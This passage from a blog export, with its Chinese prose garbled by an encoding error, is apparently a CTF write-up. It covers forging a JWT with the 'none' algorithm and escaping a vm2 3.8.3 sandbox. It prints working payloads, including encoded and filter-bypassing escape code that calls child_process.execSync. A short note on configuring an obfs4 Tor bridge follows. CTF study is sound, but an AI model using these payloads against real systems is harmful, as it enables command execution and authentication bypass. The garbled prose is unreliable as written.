JS","text":"è¿™æ¬¡çš„è™ç¬¦CTFæ²¡æŠ¥ä¸Šåä¹Ÿæ˜¯å¯æƒœï¼Œä¸è¿‡æœ‹å‹å‘æ¥é¢˜ç›®é“¾æ¥ï¼Œæ‰“å¼€ä¸€çœ‹æ˜¯JSçš„é¢˜ï¼Œè¿˜å¥½æ²¡æŠ¥åâ€¦ğŸ˜ JSå’±å•¥ä¹Ÿä¸ä¼šå‘€ï¼Œä¸è¿‡å­¦ä¹ è¿˜æ˜¯è¦å­¦ä¹ çš„ã€‚ easy_loginè€ƒå¯ŸNodeJSä»£ç å®¡è®¡ã€JSå¼±ç±»å‹ã€JWTä¼ªé€  çŸ¥è¯†è¡¥å……ç”±äºå°šæœªä¸“é—¨å­¦ä¹ JSï¼Œæœ€è¿‘çœ‹åˆ°èµ›é¢˜å°±å‘æ€µï¼Œå› ä¸ºæœ€è¿‘çš„æ¯”èµ›JSçš„é¢˜çœŸæ˜¯è¶Šæ¥è¶Šå¤šäº†ğŸ˜‘ï¼Œè¡¥å……ä¸€äº›æœ¬é¢˜æ¶‰åŠçš„çŸ¥è¯†ç‚¹å…ˆï¼š 1ã€NodeJSçš„æ¡†æ¶ç›®å½•ç»“æ„ dispatch.js ä¸»è¿›ç¨‹æ–‡ä»¶ worker.js å·¥ä½œè¿›ç¨‹ app.js åº”ç”¨ routes.js urlè·¯ç”±è¡¨ package.json ä¾èµ–æ¨¡å— config.js or config/ é…ç½®æ–‡ä»¶ controllers/ ä¸šåŠ¡é€»è¾‘ç›¸å…³ views/ è¯•å›¾æ¨¡æ¿ common/ è·Ÿä¸šåŠ¡ç›¸å…³çš„å…¬å…±æ¨¡å— proxy/ æ•°æ®è®¿é—®ä»£ç†å±‚ lib/ è·Ÿä¸šåŠ¡æ— å…³çš„å…¬å…±æ¨¡å— assets/ images|scripts|styles bin/ ç›¸å…³è¿è¡Œè„šæœ¬ node_moudules/ ä¸€èˆ¬NodeJSçš„é¡¹ç›®ï¼Œè®¿é—®app.jså³å¯è®¿é—®ä¸»æ–‡ä»¶çš„ä»£ç ï¼Œè€Œä¸»è¦çš„é€»è¾‘ä»£ç åœ¨controllers/api.jsä¸­ã€‚ 2ã€JSå¼±ç±»å‹ å¼±ç±»å‹å³æŒ‡ï¼šæ•°æ®ç±»å‹å¯ä»¥è¢«å¿½ç•¥, ä¸€ä¸ªå˜é‡å¯ä»¥èµ‹ä¸åŒæ•°æ®ç±»å‹çš„å€¼ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒç±»å‹çš„å˜é‡ä¹‹é—´è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚ç©ºæ•°ç»„[]ä¸æ•´æ•°1åšæ¯”è¾ƒï¼Œè¿”å›ä¸ºtrueï¼›å°†æµ®ç‚¹å‹æ•°ä½œä¸ºæ•°ç»„çš„ç´¢å¼•ç­‰ç­‰ã€‚ é¢å¯¹è¿™ä¸ªå¤§æ½®æµï¼ŒJSè¿˜æ˜¯è¦èµ¶ç´§å­¦å­¦å•Šâ€¦ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ä¹‹åæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæ²¡æœ‰å…¶ä»–æŒ‰é’®ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°/static/js/app.jsçš„å­˜åœ¨ï¼Œè®¿é—®ä¹‹åçœ‹åˆ°æç¤ºï¼šæˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶ï¼Œè·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XDï¼Œæç¤ºstaticæ˜¯ç›´æ¥æ˜ å°„åˆ°ç¨‹åºæ ¹ç›®å½•çš„ï¼Œé‚£ä¹ˆåº”è¯¥å¯ä»¥ç›´æ¥åœ¨æ ¹ç›®å½•ä¸‹è¿›è¡Œä»»æ„æ–‡ä»¶çš„è®¿é—®ï¼Œè®¿é—®ä¸€ä¸‹NodeJSçš„åº”ç”¨æ–‡ä»¶app.jsè¯•è¯•ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š const Koa = require('koa');const bodyParser = require('koa-bodyparser');const session = require('koa-session');const static = require('koa-static');const views = require('koa-views');const crypto = require('crypto');const { resolve } = require('path');const rest = require('./rest');const controller = require('./controller');const PORT = 3000;const app = new Koa();app.keys = [crypto.randomBytes(16).toString('hex')];global.secrets = [];app.use(static(resolve(__dirname, '.')));app.use(views(resolve(__dirname, './views'), { extension: 'pug'}));app.use(session({key: 'sses:aok', maxAge: 86400000}, app));// parse request body:app.use(bodyParser());// prepare restful serviceapp.use(rest.restify());// add controllers:app.use(controller());app.listen(PORT);console.log(`app started at port ${PORT}...`); å¯ä»¥çœ‹åˆ°è¿™é‡Œé‡‡ç”¨äº†NodeJSçš„koaæ¡†æ¶ï¼Œè¯¥æ¡†æ¶çš„ä¸»è¦é€»è¾‘ä»£ç å½“ç„¶ä¹Ÿæ˜¯åœ¨/controllers/api.jsä¸­ï¼Œæœæ–­è¯»å–ã€‚ è®¿é—®/controllers/api.jsæ‹¿åˆ°ä¸»è¦é€»è¾‘ä»£ç ï¼š const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = { 'POST /api/register': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || username === 'admin'){ throw new APIError('register error', 'wrong username'); } if(global.secrets.length &gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'}); ctx.rest({ token: token }); await next(); }, 'POST /api/login': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username &amp;&amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 'GET /api/flag': async (ctx, next) =&gt; { if(ctx.session.username !== 'admin'){ throw new APIError('permission error', 'permission denied'); } const flag = fs.readFileSync('/flag').toString(); ctx.rest({ flag }); await next(); }, 'GET /api/logout': async (ctx, next) =&gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); }}; åˆ†æä»£ç å¯çŸ¥ï¼Œä¸»è¦åŒ…å«ä¸‰ä¸ªè·¯ç”±ï¼š/api/registerè¿›è¡Œæ³¨å†Œã€/api/loginè¿›è¡Œç™»å½•ï¼Œ/api/flagè¯»å–flagï¼Œæ¥åˆ†æä¸€ä¸‹ä»£ç é€»è¾‘ã€‚ é¦–å…ˆæ˜¯registerè·¯ç”±ï¼šå®ç°äº†æ³¨å†Œè´¦æˆ·çš„åŠŸèƒ½ï¼Œé€šè¿‡æ¥å—ä¼ å…¥çš„usernameå’Œpasswordï¼Œåˆ¤æ–­usernameä¸ä¸ºadminä¹‹åï¼Œéšæœºç”Ÿæˆä¸€ä¸ªsecretå¹¶ä¸ºå…¶åˆ†é…ä¸€ä¸ªsecretidä½œä¸ºå…¶åœ¨æ•°ç»„ä¸­çš„ç´¢å¼•ï¼Œç„¶ååˆ©ç”¨secretidã€usernameã€ passwordã€secretä½œä¸ºå†…å®¹é€‰ç”¨HS256è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆä¸€ä¸ªJWTä»¤ç‰Œï¼Œæ­¤æ—¶secretä¹Ÿå·²ç»å­˜å…¥å…¨å±€æ•°ç»„ã€‚ loginè·¯ç”±ï¼šå¯¹usernameæ£€æµ‹ä¹‹åï¼Œå¯¹ç™»å½•çŠ¶æ€çš„tokenè¿›è¡Œäº†æ‹¼æ¥ï¼Œç„¶åä»å…¶ä¸­æå–äº†secretidçš„å€¼ä½œä¸ºç´¢å¼•å»æ•°ç»„ä¸­è¯»å–secretçš„å€¼ï¼Œç”¨è¯¥å€¼å¯¹tokenè¿›è¡ŒéªŒè¯ï¼Œé€šè¿‡éªŒè¯ä¹‹åï¼Œå°†ç™»å½•æ—¶çš„usernameèµ‹å€¼ç»™sessionä¸­çš„usernameã€‚ flagè·¯ç”±ï¼šåˆ¤æ–­usernameä¸ºadminä¹‹åï¼Œå³æ‰“å°flagã€‚ è‡³æ­¤ï¼Œè§£é¢˜çš„æ€è·¯ä¹Ÿå°±å¾ˆæ˜ç¡®äº†ï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨æ³¨å†Œè´¦æˆ·æ—¶æƒ³åŠæ³•ä¼ªé€ JWTä¸ºadminèº«ä»½ï¼Œç„¶åç”¨adminè´¦æˆ·ç™»å½•ï¼Œå³å¯æ‹¿åˆ°flagã€‚ è§£é¢˜å…³é”®ç‚¹å…³é”®ç‚¹å°±åœ¨äºå¦‚ä½•ä¼ªé€ JWTï¼Œä»£ç ä¸­ç”ŸæˆJWTä»¤ç‰Œæ—¶é‡‡ç”¨çš„æ—¶HS256ç®—æ³•ï¼Œå¹¶ä¸”secretæ—¶éšæœºç”Ÿæˆå¹¶å­˜å…¥æ•°ç»„ä¸­çš„ï¼Œçˆ†ç ´æ€•æ˜¯å¾ˆéš¾çˆ†ç ´å‡ºæ¥ï¼Œé‚£å°±è¦æƒ³åˆ«çš„åŠæ³•ã€‚è¿™é‡Œç”¨åˆ°çš„æ–¹æ³•æ˜¯åˆ©ç”¨noneåŠ å¯†ç®—æ³•æ¥ä¼ªé€ ï¼ŒåŸç†å¦‚ä¸‹ï¼š å½“åŠ å¯†æ—¶ä½¿ç”¨çš„æ˜¯noneç®—æ³•ï¼Œå¹¶ä¸”ç§˜é’¥çš„å€¼ä¸ºundefinedæˆ–ç©ºçš„æ—¶å€™ï¼Œåœ¨éªŒè¯æ—¶ï¼Œå³ä¾¿åé¢çš„ç®—æ³•è®¾ç½®ä¸º HS256ï¼ŒéªŒè¯ä¹Ÿè¿˜æ˜¯æŒ‰ç…§noneæ¥è¿›è¡Œå¹¶ä¸”é€šè¿‡éªŒè¯ã€‚ é€ æˆè¿™ä¸ªæ¼æ´çš„åŸå› åœ¨äºï¼šè¿™é‡ŒéªŒè¯çš„æ—¶å€™optionsé€‰ç”¨çš„æ˜¯algorithmï¼Œè€Œä¾èµ–åº“ä¸­æ­£ç¡®çš„æ˜¯algorithmsï¼Œæ­£æ˜¯è¿™ä¸ªåŸå› é€ æˆäº†ä¸Šé¢çš„æ¼æ´ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œè¿™ä¸ªé¢˜ä¸­åœ¨éªŒè¯tokençš„æ—¶å€™ï¼Œé€‰ç”¨äº†HS256ç®—æ³•å¯¹(token, secret)è¿›è¡Œäº†éªŒè¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœåˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•å»ä¼ªé€ ä¸€ä¸ªç”¨æˆ·åä¸ºadminã€secretä¸ºç©ºçš„JWTï¼Œé‚£åº”è¯¥å°±èƒ½ä¼ªé€ æˆadminèº«ä»½è¯»å–åˆ°flagäº†ï¼Œä¸è¿‡è¿˜æœ‰ä¸ªé—®é¢˜ï¼š æˆ‘ä»¬ä¼ªé€ çš„JWTä¸­çš„secretidè¦æ»¡è¶³sid !== undefinedã€sid !== nullã€(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0) == true é‚£ä¹ˆå°±å¯¹æˆ‘ä»¬ä¼ªé€ JWTæ—¶çš„secretidæå‡ºäº†è¾ƒå¤§çš„è°ƒæ•´ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œæˆ‘ä»¬å‰é¢ä¸æ˜¯æåˆ°äº†JSçš„å¼±ç±»å‹äº†å˜›ï¼Œå…¶å®æˆ‘ä»¬ä¼ ä¸€ä¸ªç©ºæ•°ç»„[]ã€ä¼ ä¸€ä¸ªæµ®ç‚¹æ•°0.1ç­‰ç­‰è¿™äº›éƒ½æ˜¯å¯ä»¥çš„å•Šï¼Œç©ºå£æ— å‡­ï¼Œè®©æˆ‘ä»¬å®è·µå‡ºçœŸçŸ¥ã€‚ å®æ“è®¿é—®registerè¿›è¡Œæ³¨å†Œï¼Œè¿”å›äº†ä¸€ä¸ªJWTä»¤ç‰Œï¼Œè§£ç çœ‹å…¶ä¸­çœ‹å…¶ä¸­å†…å®¹ï¼š å—¯â€¦æ²¡æ¯›ç—…ï¼Œè®©æˆ‘ä»¬æ¥ä¼ªé€ JWTå§ï¼š import jwttoken = jwt.encode({\"secretid\":[],\"username\": \"admin\",\"password\": \"admin\",\"iat\": 1587472023},algorithm=\"none\",key=\"\").decode(encoding='utf-8')print(token) å¾—åˆ°ä¼ªé€ çš„JWTï¼š eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3NDcyMDIzfQ. ç„¶åæ‹¿ç€æˆ‘ä»¬çš„ä»¤ç‰Œå»ç™»å½•ï¼Œç™»å½•æ—¶åœ¨authorizationå¡«å…¥ä¼ªé€ çš„JWTï¼Œæ³¨æ„ç™»é™†çš„usernameå’Œpasswordè¦ä¸ä¼ªé€ çš„JWTé‡Œçš„ä¸€æ ·ï¼ˆè¿™é‡Œæˆ‘ä»¬å‰é¢æ˜¯å·²ç»ç”¨test/testè¿›è¡Œæ³¨å†Œäº†ï¼Œä¹Ÿå°±æ˜¯è¯´å·²ç»åˆå§‹åŒ–äº†secretsæ•°ç»„ï¼Œè¿™æ ·ä¹Ÿæ›´ä¸ä¼šé€ æˆé€»è¾‘ä¸Šçš„é—®é¢˜ï¼‰ å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶çš„statusä¸ºtrueï¼Œè®°ä¸‹æ­¤æ—¶çš„sses:aokå’Œsses:aok.sigï¼Œè¿™ä¸ªsessionä¸­çš„usernameå€¼å…¶å®å·²ç»èµ‹å€¼ä¸ºadminäº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªsessionæ˜¯adminç™»å½•çš„sessionï¼Œæ‹¿ç€å®ƒå°±å¯ä»¥è¯»å–flagã€‚ æœ€åï¼Œæˆ‘ä»¬å»è®¿é—®/api/flagè·¯ç”±ï¼Œå°†è®°å½•ä¸‹çš„tokenè¿›è¡Œæ›¿æ¢ï¼Œå³å¯ä¼ªé€ ä¸ºadminèº«ä»½æ‹¿åˆ°flagï¼š æ‹¿åˆ°flagï¼Œæ’’èŠ±~ JustEscapeè€ƒå¯Ÿvm2æ²™ç®±é€ƒé€¸ã€JSæ¨¡æ¿å­—ç¬¦ä¸²ä»¥åŠå¯¹å­—ç¬¦ä¸²è¿‡æ»¤çš„é›†ä¸­ç»•è¿‡æ–¹å¼ çŸ¥è¯†è¡¥å……JSæ¨¡æ¿å­—ç¬¦ä¸²ï¼š æ¨¡æ¿å­—ç¬¦ä¸²ä½¿ç”¨åå¼•å·` æ¥ä»£æ›¿æ™®é€šå­—ç¬¦ä¸²ä¸­çš„ç”¨åŒå¼•å·å’Œå•å¼•å·ã€‚æ¨¡æ¿å­—ç¬¦ä¸²å¯ä»¥åŒ…å«ç‰¹å®šè¯­æ³•ï¼ˆ'${expression}'æ³¨æ„æ˜¯å•å¼•å·ï¼‰çš„å ä½ç¬¦ã€‚å ä½ç¬¦ä¸­çš„è¡¨è¾¾å¼å’Œå‘¨å›´çš„æ–‡æœ¬ä¼šä¸€èµ·ä¼ é€’ç»™ä¸€ä¸ªé»˜è®¤å‡½æ•°ï¼Œè¯¥å‡½æ•°è´Ÿè´£å°†æ‰€æœ‰çš„éƒ¨åˆ†è¿æ¥èµ·æ¥ï¼Œå¦‚æœä¸€ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²ç”±è¡¨è¾¾å¼å¼€å¤´ï¼Œåˆ™è¯¥å­—ç¬¦ä¸²è¢«ç§°ä¸ºå¸¦æ ‡ç­¾çš„æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œè¯¥è¡¨è¾¾å¼é€šå¸¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒä¼šåœ¨æ¨¡æ¿å­—ç¬¦ä¸²å¤„ç†åè¢«è°ƒç”¨ï¼Œåœ¨è¾“å‡ºæœ€ç»ˆç»“æœå‰ï¼Œä½ éƒ½å¯ä»¥é€šè¿‡è¯¥å‡½æ•°æ¥å¯¹æ¨¡æ¿å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œå¤„ç†ã€‚åœ¨æ¨¡ç‰ˆå­—ç¬¦ä¸²å†…ä½¿ç”¨åå¼•å·æ—¶ï¼Œéœ€è¦åœ¨å®ƒå‰é¢åŠ è½¬ä¹‰ç¬¦ï¼ˆ\\ï¼‰ã€‚ é¢˜ç›®åˆ†ææ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œå¯ä»¥æ‰§è¡Œä¸€äº›ä»£ç ï¼Œè¿™æ ·çš„è¯å²‚ä¸æ˜¯ç›´æ¥evalå°±è¡Œäº†ï¼Ÿä½†æ˜¯é¢˜ç›®æç¤ºçœŸçš„æ˜¯PHPå˜›ï¼Œemmmâ€¦å‡çš„å§ï¼Œè¿™é‡Œå­¦åˆ°éªšå§¿åŠ¿ï¼Œç”¨Error().stackè¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œæ¥çœ‹åç«¯é‡‡ç”¨çš„æ¶æ„ï¼š å¯ä»¥çœ‹åˆ°åç«¯æ˜¯ä¸€ä¸ªJSçš„VM2æ²™ç®±ï¼Œè¿›ä¸€æ­¥æµ‹è¯•å‘ç°' &quot; +éƒ½è¢«banæ‰äº†ï¼Œä¸è¿‡åˆ©ç”¨ç°æœ‰çš„é€ƒé€¸æ–¹æ³•å³å¯è¿›è¡Œé€ƒé€¸ï¼šVM2(3.8.3)é€ƒé€¸exp ä½†æ˜¯é™¤äº†å‰é¢æåˆ°çš„è¢«bançš„å­—ç¬¦å¤–ï¼Œå¾ˆå¤šå‡½æ•°ï¼Œæ¯”å¦‚ï¼šprocessã€execã€evalç­‰ä¹Ÿéƒ½è¢«è¿‡æ»¤äº†ï¼Œè§¦å‘é»‘åå•å°±ä¼šèµ é€ä¸€ä¸ªé”®ç›˜ï¼š è¿™é‡Œå¯ä»¥é€šè¿‡åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å’Œæ•°ç»„è°ƒç”¨ï¼ˆå¯¹è±¡çš„æ–¹æ³•æˆ–è€…å±æ€§åå…³é”®å­—è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹å¯ä»¥æŠŠå¯¹è±¡å½“æˆä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæ•°ç»„é‡Œé¢çš„é”®åç”¨å­—ç¬¦ä¸²æ‹¼æ¥å‡ºæ¥ï¼‰çš„æ–¹å¼æ¥ç»•è¿‡å…³é”®å­—çš„é™åˆ¶ï¼Œä½†æ˜¯è¿™é‡Œå•ã€åŒå¼•å·éƒ½è¢«banäº†ï¼Œç›´æ¥è¿›è¡Œå­—ç¬¦ä¸²çš„æ‹¼æ¥è‚¯å®šæ˜¯ä¸è¡Œï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨åå¼•å·æ¥ä»£æ›¿å•å¼•å·ï¼ŒåŒæ—¶åˆ©ç”¨æ¨¡æ¿å­—ç¬¦ä¸²åµŒå¥—æ¥æ‹¼æ¥å‡ºéœ€è¦çš„å­—ç¬¦ä¸²ã€‚ æ¯”å¦‚ï¼š `${`${`proces`}s`}` è¾“å‡ºprocess åˆ©ç”¨æ­¤æ–¹æ³•å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥å³å¯ç»•è¿‡è¿‡æ»¤ï¼Œå¯¹å‰é¢æåˆ°çš„expè¿›è¡Œæ”¹è¿›å³å¯æˆåŠŸé€ƒé€¸ã€‚ å¦ä¸€ç§ç»•è¿‡æ–¹æ³•æ˜¯åˆ©ç”¨base64ã€hexç¼–ç è¿›è¡Œç»•è¿‡ï¼Œä¸è¿‡éƒ½æ˜¯åœ¨ä¸Šé¢çš„é€ƒé€¸expåŸºç¡€ä¸Šç¼–ç è¿›è¡Œè¿›ä¸€æ­¥ç»•è¿‡çš„æ–¹æ³•ã€‚ è§£é¢˜æ–¹æ³•ä¸€ï¼šåˆ©ç”¨æ¨¡æ¿å­—ç¬¦ä¸²åµŒå¥—ç»•è¿‡ æ”¹è¿›çš„expå¦‚ä¸‹ï¼š (function (){ TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)(); try{ Object.preventExtensions(Buffer.from(``)).a = 1; }catch(e){ return e[`${`${`get_pro`}cess`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString(); }})() ç›´æ¥å°†ä¸Šé¢çš„payloadå¡«å…¥hackbarçš„URLæ æ‰§è¡Œå³å¯ï¼š æ–¹æ³•äºŒï¼šåˆ©ç”¨base64/hexç¼–ç ç»•è¿‡ é¦–å…ˆè´´ä¸€ä¸‹é€ƒé€¸çš„expï¼š TypeError.prototype.get_process = f =&gt; f.constructor(\"return process\")();try { Object.preventExtensions(Buffer.from(\"\")).a = 1;} catch (e) { e.get_process(() =&gt; { }).mainModule.require(\"child_process\").execSync(\"cat /flag\").toString();} å¯¹å‰é¢çš„expè¿›è¡Œç¼–ç ï¼Œè¿›ä¸€æ­¥ç»•è¿‡è¿‡æ»¤ base64ç¼–ç payloadï¼š global[[`eva`,%20`l`].join(``)](Buffer.from(`VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ==`,%20`base64`).toString(`ascii`)); hexç¼–ç payloadï¼š (function(){TypeError[String.fromCharCode(112,114,111,116,111,116,121,112,101)][`\\x67\\x65\\x74\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`] = f=&gt;f[`\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72`](`\\x72\\x65\\x74\\x75\\x72\\x6e\\x20\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`)();try{Object.preventExtensions(Buffer.from(``)).a = 1;}catch(e){return e[`\\x67\\x65\\x74\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`](()=&gt;{}).mainModule.require((`\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`))[`\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63`](`cat /flag`).toString();}})() æ‰§è¡Œç»“æœï¼š å°ç»“ä¸€ä¸‹è¿™ä¸¤é“é¢˜å¯¹é€æ­¥å­¦ä¹ JSè¿˜æ˜¯å¾ˆæœ‰ç”¨æ»´ï¼Œä¸è¿‡ä¹Ÿææ…Œäº†ï¼Œæ„Ÿè§‰åˆå•¥ä¹Ÿä¸ä¼šäº†ğŸ˜… å‚è€ƒï¼šèµµå¸ˆå‚…çš„è¶…è¯¦ç»†é¢˜è§£VM2(3.8.3)é€ƒé€¸expJSæ¨¡æ¿å­—ç¬¦ä¸²åµŒå¥—","link":"/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/"},{"title":"obfs4ç½‘æ¡¥é—®é¢˜çš„å¤„ç†","text":"æ˜¨å¤©çš„é—®é¢˜ä¸Šåˆåˆšè§£å†³ï¼Œç»“æœåˆæœ‰æ–°é—®é¢˜â€¦ ä¸è¿‡è¿™é—®é¢˜ç½‘ä¸Šå¥½åƒè¿˜æœ‰äººé—®äº†ï¼Œä½†æ˜¯è²Œä¼¼æ²¡ä»€ä¹ˆè§£å†³æ–¹æ¡ˆï¼Œè¿˜æœ‰äººè¯´æ˜¯obfs4çš„ä¸€ä¸ªbugï¼Œç€å®è®©æˆ‘æŠ“ç‹‚ï¼Œæ„Ÿè§‰æ˜¯å…¨ç½‘ç¬¬ä¸€ä¸ªè§£å†³çš„äººï¼Œèµ·ç åº”è¯¥æ˜¯ç¬¬ä¸€ç¯‡è§£å†³çš„æ–‡ç« ã€‚æƒ¬æ„~ğŸ¤£ æŠ¥é”™é—®é¢˜ä¸ŠåˆæˆåŠŸç¼–è¯‘obfs4é¡¹ç›®ä¹‹åï¼Œéšåå°±å¯¹/etc/tor/torrcæ–‡ä»¶åšäº†å¦‚ä¸‹çš„é…ç½®ï¼š Log notice file /var/log/tor/notices.logRunAsDaemon 1ORPort 44443 #æ³¨æ„è¿™ä¸ªç«¯å£å®˜æ–¹æä¾›é…ç½®æ˜¯443ï¼Œä¸è¿‡443å¯èƒ½è¢«å ç”¨å¯¼è‡´torå¯åŠ¨å¤±è´¥ï¼Œæ”¹ä¸€ä¸‹å°±è¡ŒExitpolicy reject *:*BridgeRelay 1ServerTransportPlugin obfs4 exec /usr/local/bin/obfs4proxyExtORPort autoPublishServerDescriptor 0 ç„¶åé‡å¯toræœåŠ¡ï¼šservice tor restartï¼ŒæŸ¥çœ‹ä¸€ä¸‹torçš„è¿è¡ŒçŠ¶æ€æ˜¯æ²¡é—®é¢˜ï¼Œå—¯ï¼Œæ”¾å¿ƒäº†ã€‚ ç„¶åtail -F /var/log/tor/notices.logï¼ŒåŸæœ¬ä»¥ä¸ºæ²¡é—®é¢˜ï¼Œä½†æ˜¯å›æ˜¾ç»“æœå¦‚ä¸‹ï¼š æ²¡é”™ï¼ŒæŠ¥äº†å¦‚ä¸‹é”™è¯¯ï¼š [warn] Could not launch managed proxy executable at '/usr/local/bin/obfs4proxy' ('Permission denied'). è€ŒæˆåŠŸçš„å›æ˜¾å‘¢ï¼Ÿ æ²¡é”™ï¼Œæ˜¯ä¸Šé¢è¿™ç§æƒ…å†µ ç„¶åå°±ç–¯ç‹‚ç§‘å­¦ä¸Šç½‘æ‰¾è§£å†³æ–¹å¼ï¼Œè¯´æ˜¯ä»€ä¹ˆè¦ä»¥æ‰˜ç®¡çš„æ–¹å¼è¿è¡Œï¼Œä½†æ˜¯å°±æ˜¯ä¸€ç›´è§£å†³ä¸äº†â€¦ å‘ç°çŒ«è…»æ˜¯åœ¨å¤šæ¬¡å°è¯•ä¸­ï¼Œå‘ç°äº†ç–‘ä¼¼é—®é¢˜çš„å¤šæ¬¡restartæœåŠ¡ï¼Œå‘ç°toræœåŠ¡éƒ½æ­£å¸¸ï¼Œå½“æ—¶å½“ç»ˆç«¯ç›´æ¥é”®å…¥torå»è¿è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå—¯ï¼Ÿï¼Ÿï¼Ÿ ä¸çŸ¥é“æ˜¯ç«¯å£å ç”¨è¿˜æ˜¯è¿›ç¨‹æ²¡è¢«æ€æ­»ï¼Œä½†æ˜¯è¿™åº”è¯¥å°±æ˜¯é—®é¢˜æ‰€åœ¨äº†ï¼Œå› ä¸ºç»ˆç«¯é”®å…¥torå…¶å®æ˜¯æ‰§è¡Œtorè¿™ä¸ªç¨‹åºï¼Œè€Œrestartæ˜¯å¯¹toræœåŠ¡çš„æ“ä½œï¼ŒæœåŠ¡æˆåŠŸè¿è¡Œä¸ä»£è¡¨ç€torå¯åŠ¨äº†å‘€ï¼Œtorä¸å¯åŠ¨ï¼Œé‚£å°±ä¸æ˜¯ä»¥æ‰˜ç®¡æ–¹å¼å»è¿è¡Œobfs4proxyäº†å‘€ï¼Œæ‰€æœ‰è¿™å°±æ˜¯é—®é¢˜ï¼ è§£å†³é—®é¢˜ç”±äºæœ€åˆæ˜¯yumå®‰è£…çš„torï¼Œå°è¯•é‡è£…æ— æœï¼Œä¾¿é€‰æ‹©äº†è‡ªå·±ä¸‹è½½æºç ç¼–è¯‘ã€‚ ç¼–è¯‘ã€å®‰è£…å®Œæˆä¹‹åï¼Œå¯¹/usr/local/etc/torä¸‹çš„torrcè¿›è¡Œå‰é¢æåˆ°çš„é…ç½®ï¼Œç„¶åæ‰§è¡Œå¯æ‰§è¡Œç¨‹åºï¼Œåœ¨/usr/local/binä¸­ã€‚ ä»¥å‘½ä»¤./tor;tail -F /var/log/tor/notices.logåŒæ—¶å¯åŠ¨torå’Œç½‘æ¡¥ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š good! 